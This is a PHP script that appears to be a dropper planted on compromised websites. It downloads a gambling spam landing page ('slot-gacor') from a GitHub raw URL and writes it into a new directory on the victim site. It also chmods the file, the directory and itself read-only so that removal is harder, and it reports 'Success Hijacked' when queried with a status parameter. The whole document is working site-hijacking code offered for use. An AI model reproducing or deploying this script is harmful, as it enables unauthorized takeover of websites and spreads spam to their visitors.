<?php
$realpath = getcwd().$_SERVER['SCRIPT_NAME'];
chmod($realpath, 0444);
$permt = substr(sprintf('%o', fileperms($realpath)), -4);
$path = getcwd()."/slot-gacor/";
$file = getcwd()."/slot-gacor/index.php";
if(!file_exists($file)){
mkdir($path, 0755, true);
$xmlData = file_get_contents("https://raw.githubusercontent.com/sudoasu1337/slot-gacor.cmder.net/main/index.html");
file_put_contents($file, $xmlData);
}else{
if(isset($_GET['status'])){
if(file_exists($file)){
echo "Success Hijacked -> ".$file."<br />";
echo "LP Mu Aman Boss -> <a href='https://".$_SERVER["HTTP_HOST"]."/slot-gacor/index.php'>".$_SERVER['HTTP_HOST']."/slot-gacor/</a>";
}else{
echo "Failed Hijacking -> ".$file;
}}}
chmod($file, 0444);
$perm = substr(sprintf('%o', fileperms($file)), -4);
chmod($path, 0555);
$perms = substr(sprintf('%o', fileperms($path)), -4);
?>
